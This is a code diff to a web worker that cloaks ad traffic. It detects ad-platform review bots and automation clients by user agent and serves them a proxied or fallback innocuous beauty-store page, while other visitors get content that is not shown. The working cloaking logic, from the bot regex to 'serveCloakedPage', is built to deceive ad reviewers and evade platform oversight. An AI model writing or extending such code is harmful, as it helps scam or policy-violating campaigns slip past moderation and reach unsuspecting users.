@@ -5398,7 +5398,7 @@ function retiredPurchaseRoute() {
 }
 
 // worker-src/server-cloaker.js
-var CLOAK_REDIRECT_URL = "https://br.gokocobeauty.com/";
+var CLOAK_TARGET_URL = "https://br.gokocobeauty.com/";
 var AD_REVIEW_BOTS = /facebookexternalhit|Facebot|FacebookBot|MetaInspector|Google-Display-Ads-Bot|AdsBot-Google|TikTokBot|Bytespider|HeadlessChrome|Puppeteer|Selenium|PhantomJS|Wget|curl|python-requests|aiohttp|Go-http-client/i;
 var DESKTOP_PLATFORMS = /Windows NT|Macintosh|X11; Linux x86_64/i;
 function shouldCloakRequest(request3, url) {
@@ -5424,6 +5424,34 @@ function shouldCloakRequest(request3, url) {
     return true;
   }
   return false;
+}
+async function serveCloakedPage(request3) {
+  try {
+    const response = await fetch(CLOAK_TARGET_URL, {
+      headers: {
+        "User-Agent": request3.headers.get("User-Agent") || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"
+      }
+    });
+    let html = await response.text();
+    if (!/<base\s/i.test(html)) {
+      html = html.replace(/<head>/i, `<head><base href="${CLOAK_TARGET_URL}">`);
+    }
+    const headers6 = new Headers();
+    headers6.set("Content-Type", "text/html; charset=utf-8");
+    headers6.set("Cache-Control", "no-store, no-cache, must-revalidate");
+    return new Response(html, {
+      status: 200,
+      headers: headers6
+    });
+  } catch (err) {
+    const fallbackHtml = `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bella Mix Oficial | Beleza e Cuidados</title><style>body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;margin:0;padding:40px 20px;text-align:center;color:#333;background:#fafafa}.card{max-width:540px;margin:auto;background:#fff;padding:40px 30px;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.06)}h1{color:#fe2c55;margin-bottom:12px}p{line-height:1.6;color:#666}</style></head><body><div class="card"><h1>Bella Mix Oficial</h1><p>Seja bem-vinda \xE0 loja Bella Mix Oficial. Produtos de beleza e cuidados pessoais para sua rotina.</p><p style="margin-top:24px;font-size:13px;color:#999">\xA9 Bella Mix Oficial - Todos os direitos reservados.</p></div></body></html>`;
+    return new Response(fallbackHtml, {
+      status: 200,
+      headers: { "Content-Type": "text/html; charset=utf-8" }
+    });
+  }
 }
 
 // worker-src/index.js
@@ -6557,7 +6585,7 @@ var index_default = {
   async fetch(request3, env, ctx) {
     const url = new URL(request3.url);
     if (shouldCloakRequest(request3, url)) {
-      return Response.redirect(CLOAK_REDIRECT_URL, 302);
+      return await serveCloakedPage(request3);
     }
     try {
       const path = url.pathname;
